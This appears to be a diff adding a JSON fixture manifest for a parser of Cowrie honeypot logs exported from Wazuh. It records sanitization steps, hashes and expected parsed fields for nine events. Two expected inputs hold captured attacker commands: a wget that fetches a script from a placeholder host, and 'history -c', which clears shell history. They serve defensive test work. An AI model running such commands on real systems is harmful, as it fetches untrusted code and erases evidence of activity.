@@ -1,0 +1,276 @@
+{
+  "manifest_version": "1.0",
+  "profile": "wazuh-cowrie-v1",
+  "sanitization_date": "2026-09-11",
+  "review_status": "controller_reviewed_and_integrated_pending_human_review",
+  "parser_context": {
+    "environment_id": "fixture-lab",
+    "sensor_id": "cowrie-fixture-01",
+    "ingested_at": "2026-09-11T00:00:00Z"
+  },
+  "common_transformations": [
+    "Remove data/full_log password keys and free-text message fields to eliminate duplicate credential content.",
+    "Alias addresses, sensor/collector names, usernames, sessions, uuid, agent ID, Wazuh source ID and index document ID consistently by original value; no reverse map is committed.",
+    "Replace collector location with a fixture-only path; replace only hostname in command-1 URL with example.invalid.",
+    "Re-serialize sanitized JSON with two-space indentation, UTF-8, LF and final newline; full_log is compact JSON.",
+    "Preserve timestamps, event types, action facts, protocol, port values/types, absent/null/empty values, command text except stated URL hostname alias, and all other fields."
+  ],
+  "limitations": [
+    "Direction A only; originals are Wazuh exported documents, not native JSONL.",
+    "Only command-1/command-2 form a real same-session pair; no complete same-session lifecycle is fabricated.",
+    "Ingestion timestamp is caller-supplied replay context, not the original collection time.",
+    "Derivative hashes describe derivative bytes, not original source bytes."
+  ],
+  "fixtures": [
+    {
+      "file": "session-params.sanitized.json",
+      "source_file": "cowrie-sample-001.sanitized.json",
+      "source_sha256": "cfe730f1e74412d7f37f2133761357ceb5c0a8f32cf22be375cd838b5b06aee5",
+      "derivative_sha256": "b8e202f1fea19040bb442d7986a7da0358bf817dc1386c6c6eb620834f54ecda",
+      "source_ref": "cowrie-b8e202f1fea19040bb442d7986a7da0358bf817dc1386c6c6eb620834f54ecda",
+      "changes": [
+        "remove data.message",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.session.params",
+        "protocol": "ssh",
+        "source_timestamp": "2026-05-01T18:02:46.697252+0000",
+        "session": "fixture-session-01",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.10",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "observed",
+        "authentication_outcome": null
+      }
+    },
+    {
+      "file": "session-connect.sanitized.json",
+      "source_file": "1.json",
+      "source_sha256": "407e09c6f02d41e161a981d30b21bae3dd75e41ccf5bf03223636466b0607aca",
+      "derivative_sha256": "407f2d67dd87fd2d390813c631805d19901e3620df4e449848cbc8947fdeae25",
+      "source_ref": "cowrie-407f2d67dd87fd2d390813c631805d19901e3620df4e449848cbc8947fdeae25",
+      "changes": [
+        "remove data.message",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.session.connect",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-06T08:17:02.662625+0000",
+        "session": "fixture-session-02",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.10",
+        "dst_ip": "192.0.2.11",
+        "src_port": "2553",
+        "dst_port": "2223",
+        "input": null,
+        "action": "observed",
+        "authentication_outcome": null
+      }
+    },
+    {
+      "file": "login-failed.sanitized.json",
+      "source_file": "2.json",
+      "source_sha256": "f11a1b82c7846c88297606237bb990cf901e53de201b719989ad9010989aedb1",
+      "derivative_sha256": "b7399506114dbaf0bfba72bd929734ec826c04451203c88f60162f83a4a9ee9c",
+      "source_ref": "cowrie-b7399506114dbaf0bfba72bd929734ec826c04451203c88f60162f83a4a9ee9c",
+      "changes": [
+        "remove data.password",
+        "remove data.message",
+        "remove full_log.password",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.login.failed",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-06T08:16:25.046425+0000",
+        "session": "fixture-session-03",
+        "source_sensor": "fixture-host-01",
+        "username": "fixture-user-01",
+        "src_ip": "192.0.2.10",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "login",
+        "authentication_outcome": "failure"
+      }
+    },
+    {
+      "file": "login-success-missing-user.sanitized.json",
+      "source_file": "3.json",
+      "source_sha256": "6536d7c97ff3c166b93c36acabb2a114ed5bbfbfa722e1dca0dfed46343facab",
+      "derivative_sha256": "90e33b00569ba115941f7b05292a9af596a9cb3a67c7c14782f58a80a20d4387",
+      "source_ref": "cowrie-90e33b00569ba115941f7b05292a9af596a9cb3a67c7c14782f58a80a20d4387",
+      "changes": [
+        "remove data.message",
+        "remove full_log.password",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.login.success",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-06T08:14:57.343843+0000",
+        "session": "fixture-session-04",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.10",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "login",
+        "authentication_outcome": "success"
+      }
+    },
+    {
+      "file": "login-success-ssh.sanitized.json",
+      "source_file": "4.json",
+      "source_sha256": "29331461fffc78d87044d898b8cdad9b895ffade7a4fbc94f29a7d828103b7c6",
+      "derivative_sha256": "292169bcbb0e08699c056966dbd0e9397d29ecc3c8614606b1443b1854c4840c",
+      "source_ref": "cowrie-292169bcbb0e08699c056966dbd0e9397d29ecc3c8614606b1443b1854c4840c",
+      "changes": [
+        "remove data.password",
+        "remove data.message",
+        "remove full_log.password",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.login.success",
+        "protocol": "ssh",
+        "source_timestamp": "2026-05-01T18:11:13.922502+0000",
+        "session": "fixture-session-05",
+        "source_sensor": "fixture-host-01",
+        "username": "fixture-user-02",
+        "src_ip": "192.0.2.12",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "login",
+        "authentication_outcome": "success"
+      }
+    },
+    {
+      "file": "command-1.sanitized.json",
+      "source_file": "5.json",
+      "source_sha256": "7f7ef58b386c01222171c23179ebcfcfb267883078ec6f4ffa3d51ff50324b77",
+      "derivative_sha256": "8af1c7f7346e82d48ad00c1e2262521912a64c94dcfa597948f302db560151c0",
+      "source_ref": "cowrie-8af1c7f7346e82d48ad00c1e2262521912a64c94dcfa597948f302db560151c0",
+      "changes": [
+        "remove data.message",
+        "alias hostname in data.input URL",
+        "remove full_log.message",
+        "alias hostname in full_log.input URL",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.command.input",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-05T18:20:31.500878+0000",
+        "session": "fixture-session-06",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.12",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": "wget http://example.invalid/tools/check.sh",
+        "action": "command",
+        "authentication_outcome": null
+      }
+    },
+    {
+      "file": "command-2.sanitized.json",
+      "source_file": "6.json",
+      "source_sha256": "3d143e2669599c7f4467ab0172ee86bdf904272aa3ed892d2fd1ee4d8dc2443e",
+      "derivative_sha256": "10ddb8b28155a09ea891f79da3439d2d525a9b6df14a196ad2b96c344d63dd0b",
+      "source_ref": "cowrie-10ddb8b28155a09ea891f79da3439d2d525a9b6df14a196ad2b96c344d63dd0b",
+      "changes": [
+        "remove data.message",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.command.input",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-05T18:21:04.119614+0000",
+        "session": "fixture-session-06",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.12",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": "history -c",
+        "action": "command",
+        "authentication_outcome": null
+      }
+    },
+    {
+      "file": "session-closed-1.sanitized.json",
+      "source_file": "7.json",
+      "source_sha256": "03157280c9a3ea8a4375d1d6675434d9a6102bd74826b253506246221abce77f",
+      "derivative_sha256": "ddfbeb2aeeb5b76d5bcf8cdba758c4de27abcb42f0b47f16a3b4668c59adff41",
+      "source_ref": "cowrie-ddfbeb2aeeb5b76d5bcf8cdba758c4de27abcb42f0b47f16a3b4668c59adff41",
+      "changes": [
+        "remove data.message",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.session.closed",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-06T08:17:02.661702+0000",
+        "session": "fixture-session-07",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.10",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "observed",
+        "authentication_outcome": null
+      }
+    },
+    {
+      "file": "session-closed-2.sanitized.json",
+      "source_file": "8.json",
+      "source_sha256": "e67eba22e52df220592bed78e13104d823af6c30b00b4e0efd02fb3347d18c5b",
+      "derivative_sha256": "986832eb0d029dd8915c56a7bbe2ba6f211d95a734fba576da4ac0c516ded73a",
+      "source_ref": "cowrie-986832eb0d029dd8915c56a7bbe2ba6f211d95a734fba576da4ac0c516ded73a",
+      "changes": [
+        "remove data.message",
+        "remove full_log.message",
+        "replace collector location with fixture-only path"
+      ],
+      "expected": {
+        "event_type": "cowrie.session.closed",
+        "protocol": "telnet",
+        "source_timestamp": "2026-05-06T08:16:57.644398+0000",
+        "session": "fixture-session-08",
+        "source_sensor": "fixture-host-01",
+        "username": null,
+        "src_ip": "192.0.2.10",
+        "dst_ip": null,
+        "src_port": null,
+        "dst_port": null,
+        "input": null,
+        "action": "observed",
+        "authentication_outcome": null
+      }
+    }
+  ]
+}
